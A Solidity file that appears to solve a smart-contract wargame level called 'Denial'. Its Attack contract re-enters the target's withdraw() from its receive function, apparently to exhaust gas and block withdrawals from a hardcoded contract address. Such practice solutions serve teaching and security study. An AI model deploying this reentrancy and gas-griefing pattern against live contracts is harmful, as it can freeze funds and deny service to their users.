// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {

    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
    receive() external payable ;

}

contract Attack {
    Denial denial = Denial(payable(0x781e157cFEb692b4153EC84a2D9d41ecA617DaB8));
    receive() external payable {
    address(denial).call(abi.encodeWithSignature("withdraw()"));
    }
}

